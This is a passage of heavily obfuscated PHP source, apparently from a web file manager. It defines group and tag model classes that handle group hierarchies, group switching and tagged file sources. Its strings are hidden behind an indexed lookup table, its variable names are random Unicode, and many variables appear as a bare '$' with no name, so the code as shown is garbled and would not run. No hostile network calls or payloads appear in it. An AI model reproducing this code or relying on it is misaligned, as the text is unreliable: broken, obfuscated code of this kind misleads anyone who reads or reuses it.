} } unset($ל); foreach ($㺴 as $ֱ => $Ѓ) { if ($Ѓ) { continue; } $ܞ = $this->getInfoSimple($ֱ); $㺴[$ֱ] = $ܞ[$[42]]; } $۞ = $GLOBALS[$[6]][$[99]][$[1999]]; if ($GLOBALS[$[544]] == $[98]) { $۞ = !1; } foreach ($ as &$ל) { $ = $this->parentLevelArray($ל[$[561]]); $΀ = $[12]; foreach ($ as $ֱ => $Ԟ) { if ($۞ && $ֱ == 0) { continue; } $΀ .= $㺴[$Ԟ] . $[8]; } if ($) { $΀ .= $ל[$[42]]; } $ל[$[566]] = str_replace($[569], $[8], $΀); } unset($ל); } private function _listAppendSourceRoot(&$ʱ, $ڵ) { $ =& $_SERVER[ʯ]; $֑ = Model($[885])->listSourceRoot(SourceModel::TYPE_GROUP, $ڵ); $֑ = array_to_keyvalue($֑, $[546]); $֑ = array_remove_key($֑, $[546]); foreach ($ʱ as &$ǖ) { $ǖ[$[97]] = $֑[$ǖ[$[1896]]] ? $֑[$ǖ[$[1896]]] : array(); } unset($ǖ); } protected function groupMerge($첧) { $첧 = array_values(array_unique($첧)); $Ɯ = array(); for ($ = 0; $ < count($첧); $++) { $ = !1; for ($󅗤 = 0; $󅗤 < count($첧); $󅗤++) { if ($ == $󅗤) { continue; } if ($this->isParentOf($첧[$󅗤], $첧[$])) { $ = !0; break; } } if (!$) { $Ɯ[] = $첧[$]; } } return $Ɯ; } protected function isParentOf($, $) { $޲ =& $_SERVER[ʯ]; if (!$ || !$ || $ == $) { return !1; } $Σ = $this->getInfoSimple($); $ߛՀ = $this->getInfoSimple($); $ٗ = $Σ[$޲[561]] . $ . $޲[60]; if (substr($ߛՀ[$޲[561]], 0, strlen($ٗ)) == $ٗ) { return !0; } return !1; } public function groupShowRoot($, $ڡ = false) { $Ϫ =& $_SERVER[ʯ]; $邑 = $this->getInfo($); if (!$邑) { return array(); } $ږ = $this->parentLevelArray($邑[$Ϫ[561]]); $ԝ = array($); if (count($ږ) == 0) { return $ԝ; } if ($ڡ && count($ږ) == 1) { return $ԝ; } if (!$邑[$Ϫ[515]] || !isset($邑[$Ϫ[515]][$Ϫ[1982]]) || $邑[$Ϫ[515]][$Ϫ[1982]] == $Ϫ[1951]) { return $this->groupShowRoot($ږ[count($ږ) - 1], $ڡ); } if ($邑[$Ϫ[515]][$Ϫ[1982]] == $Ϫ[409]) { $׿ = explode($Ϫ[60], $邑[$Ϫ[515]][$Ϫ[1983]]); if ($׿) { $ԝ = array_merge($ԝ, $׿); } } return $ԝ; } protected function resetParentLevel() { $ =& $_SERVER[ʯ]; $Ѐ = $[1896]; $鱖 = $this->select(); $鱖 = array_to_keyvalue($鱖, $Ѐ); foreach ($鱖 as $ų䰌) { $ȫ = $ų䰌; $ = array(); while ($ȫ[$[189]] != 0) { $[] = $ȫ[$[189]]; $ȫ = $鱖[$ȫ[$[189]]]; } $[] = 0; $ = $[60] . implode($[60], array_reverse($)) . $[60]; $this->setNamePinyin($ų䰌[$Ѐ], $ų䰌[$[42]]); $this->where(array($Ѐ => $ų䰌[$Ѐ]))->save(array($[628] => $)); } return $鱖; } public function groupNameAuto($ѓ, $) { $ =& $_SERVER[ʯ]; $ʓ = $this->where(array($[453] => $ѓ))->getField($[42], !0); if (!$ʓ || !in_array($, $ʓ)) { return $; } for ($挮 = 1; $挮 <= count($ʓ) + 1; $挮++) { $ޓ = $ . "\x28{$挮}\x29"; if (!in_array($ޓ, $ʓ)) { return $ޓ; } } } public function groupSwitch($º, $ܬ) { $ĆƝ =& $_SERVER[ʯ]; $لƌ = array($ĆƝ[1896] => array($ĆƝ[7], array($º, $ܬ))); $⟉ = $this->where($لƌ)->select(); $⟉ = array_to_keyvalue($⟉, $ĆƝ[1896]); if (!isset($⟉[$º]) || !isset($⟉[$ܬ]) || $⟉[$º][$ĆƝ[189]] == 0) { return !1; } $لƌ = array($ĆƝ[1896] => $º); $ˋ = Model($ĆƝ[1986])->where($لƌ)->select(); if (!$ˋ) { $ˋ = array(); } foreach ($ˋ as $) { $ = $[$ĆƝ[1704]]; $لƌ = array($ĆƝ[1704] => $, $ĆƝ[1896] => $ܬ); $ = Model($ĆƝ[1986])->where($لƌ)->find(); if (!$) { $ = array($ܬ => $[$ĆƝ[2000]]); Model($ĆƝ[575])->userGroupAdd($, $); } Model($ĆƝ[575])->userGroupRemove($, $º); } $لƌ = array($ĆƝ[187] => 2, $ĆƝ[189] => 0, $ĆƝ[461] => 1, $ĆƝ[546] => array($ĆƝ[7], array($º, $ܬ))); $ԩ = Model($ĆƝ[885])->where($لƌ)->field($ĆƝ[2001])->select(); $ԩ = array_to_keyvalue($ԩ, $ĆƝ[546], $ĆƝ[190]); $ͳ = !empty($ԩ[$º]) ? $ԩ[$º] : !1; if ($ͳ) { if (!$ԩ[$ܬ]) { $ԩ[$ܬ] = Model($ĆƝ[885])->groupRootAdd($ܬ); } $ּ = $ԩ[$ܬ]; $لƌ = array($ĆƝ[189] => $ͳ); $ԩ = Model($ĆƝ[885])->where($لƌ)->field($ĆƝ[2002])->select(); if (!$ԩ) { $ԩ = array(); } Model($ĆƝ[885])->moveClearAuth = !1; foreach ($ԩ as $ޱ) { $ = $ޱ[$ĆƝ[461]] == $ĆƝ[98] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ĆƝ[885])->move($ޱ[$ĆƝ[190]], $ּ, $); } Model($ĆƝ[885])->moveClearAuth = !0; $لƌ = array($ĆƝ[187] => 2, $ĆƝ[546] => $º); $ĕŽ = array($ĆƝ[546] => $ܬ); Model($ĆƝ[2003])->where($لƌ)->save($ĕŽ); Model($ĆƝ[2004])->where($لƌ)->save($ĕŽ); } $this->_changeChildLevel($⟉[$º], $⟉[$ܬ], !0); $this->where(array($ĆƝ[189] => $º))->save(array($ĆƝ[189] => $ܬ)); $this->_clearChildrenCache($⟉[$ܬ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\165\163\145\162\x5f\146\x61\166"; protected function cacheFunctionAlias($ƹ) { $Ć =& $_SERVER[ʯ]; return array($Ć[2005] => array($ƹ[0], $Ć[2006]), $Ć[2007] => array($ƹ[0], $Ć[2008])); } protected function get($) { $ =& $_SERVER[ʯ]; $氰 = Model($[562])->metaGet($, $[2009]); $ = json_decode($氰, !0); return $ ? $ : array($[2010] => $[98], $[421] => array()); } protected function set($̠, $) { $ɑ =& $_SERVER[ʯ]; $ = $ ? $ : array($ɑ[2010] => $ɑ[98], $ɑ[421] => array()); return Model($ɑ[562])->metaSet($̠, $ɑ[2009], json_encode($)); } protected function getByTagID($Ż, $ѿק) { $ =& $_SERVER[ʯ]; if (!$Ż || !$ѿק) { return !1; } if (!Model($[562])->getInfoSimple($Ż)) { return !1; } $ = $this->get($Ż); if (!$ || !isset($[$[421]])) { return !1; } $揆 = array_find_by_field($[$[421]], $[451], $ѿק); return is_array($揆) ? $揆 : !1; } public function listSource($ߖ, $݆) { $ö =& $_SERVER[ʯ]; if ($݆ && !is_array($݆)) { $݆ = array($݆); } $ƌ = $this->listData($ߖ); $ = array(); foreach ($ƌ as $Ƭ) { $ = $Ƭ[$ö[94]]; if (!$) { continue; } if (!isset($[$])) { $[$] = array(); } $[$][] = $Ƭ[$ö[476]]; } $έ = array(); foreach ($ as $ => $ފꢉ) { $ = !0; if (!$݆) { $έ[] = $; continue; } foreach ($݆ as $܄) { if (!in_array($܄, $ފꢉ)) { $ = !1; break; } } if ($) { $έ[] = $; } } if (!$έ) { return array(); } $ = array($ö[467] => array($ö[468], $έ), $ö[546] => $ߖ, $ö[187] => SourceModel::TYPE_GROUP); $ = Model($ö[1393])->listSource($); if (!$ || count($έ) == $[$ö[418]][$ö[419]]) { return $; } $Ⱦ = array(); $ = array_to_keyvalue($[$ö[92]], $ö[12], $ö[190]); $݊ = array_to_keyvalue($[$ö[93]], $ö[12], $ö[190]); $א = array_merge($݊, $); foreach ($έ as $) { if (!in_array($, $א)) { $Ⱦ[] = $; } } if ($Ⱦ) { $this->removeBySource($ߖ, $Ⱦ); } return $; } protected function listData($˷) { $ =& $_SERVER[ʯ]; $脦փ = array($[1695] => 0, $[533] => array($[2011], 0), $[472] => $[2012] . $˷); $ = $[2013]; $˚ƌ = $this->field($)->where($脦փ)->order($[2014])->select(); return $˚ƌ ? $˚ƌ : array(); } protected function addToTag($鸔, $, $) { $Ǌ =& $_SERVER[ʯ]; if (!$this->getByTagID($鸔, $) || !$) { return !1; } if (!Model($Ǌ[885])->pathInfo($)) { return !1; } $Т = array($Ǌ[1695] => 0, $Ǌ[533] => $, $Ǌ[471] => $, $Ǌ[472] => $Ǌ[2015] . $鸔, $Ǌ[470] => $Ǌ[12], $Ǌ[1900] => 0); if ($this->where($Т)->find()) { return !1; } return $this->add($Т); } protected function removeFromTag($, $Б, $ͱ) { $ =& $_SERVER[ʯ]; if (!$this->getByTagID($, $ͱ) || !$Б) { return !1; } if (is_array($Б)) { $Б = array($[7], $Б); } $ = array($[1695] => 0, $[533] => $ͱ, $[472] => $[2015] . $, $[471] => $Б); return $this->where($)->delete(); } protected function removeByTag($, $ί) { $ =& $_SERVER[ʯ]; if (!$this->getByTagID($, $ί)) { return !1; } $ = array($[1695] => 0, $[533] => $ί, $[472] => $[2015] . $); return $this->where($)->delete(); } protected function removeBySource($, $ٔ) { $ =& $_SERVER[ʯ]; if (!$ || !$ٔ) { return !1; } if (is_array($ٔ)) { $ٔ = array($[7], $ٔ); } $ߙ = array($[1695] => 0, $[471] => $ٔ, $[533] => array($[1075], 0), $[472] => $[2015] . $); return $this->where($ߙ)->delete(); } } goto d蚊; C: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($) { $ =& $_SERVER[ʯ]; return array($[2007] => array($[2397] . USER_ID, $[2008])); } protected function listData() { $ܝݖ =& $_SERVER[ʯ]; $ʸ = array($ܝݖ[1695] => USER_ID, $ܝݖ[533] => array($ܝݖ[2011], 0)); $憁 = $ܝݖ[2398]; $Ǎ = $this->field($憁)->where($ʸ)->order($ܝݖ[2014])->select(); return $Ǎ ? $Ǎ : array(); } protected function addToTag($, $) { $ =& $_SERVER[ʯ]; if (!Model($[2156])->listData($)) { return !1; } if (is_numeric($)) { $ޔ֒ = Model($[885])->pathInfo($); if (!$ޔ֒) { return !1; } } else { $ޔ֒ = IO::infoSimple($); if (!$ޔ֒) { return !1; } $ = $ޔ֒[$[42]]; $ = $ޔ֒[$[43]]; if (isset($ޔ֒[$[461]])) { $ = $ޔ֒[$[461]] == $[98] ? $[85] : $[223]; } } $ڳ = array($[1695] => USER_ID, $[533] => $, $[471] => $, $[472] => $ ? $ : $[466], $[470] => $ ? $ : $[12], $[1900] => 0); if ($this->where($ڳ)->find()) { return !1; } return $this->add($ڳ); } protected function removeFromTag($ጐ, $) { $پ =& $_SERVER[ʯ]; if (!Model($پ[2156])->listData($)) { return !1; } if (is_array($ጐ)) { $ጐ = array($پ[7], $ጐ); } $猔 = array($پ[1695] => USER_ID, $پ[533] => $, $پ[471] => $ጐ); return $this->where($猔)->delete(); } protected function removeByTag($) { $ =& $_SERVER[ʯ]; if (!$) { return !1; } $ = array($[1695] => USER_ID, $[533] => $); return $this->where($)->delete(); } protected function removeBySource($) { $ݺՇ =& $_SERVER[ʯ]; if (is_array($)) { $ = array($ݺՇ[7], $); } $ָ = array($ݺՇ[1695] => USER_ID, $ݺՇ[533] => array($ݺՇ[1075], 0), $ݺՇ[471] => $); return $this->where($ָ)->delete(); } }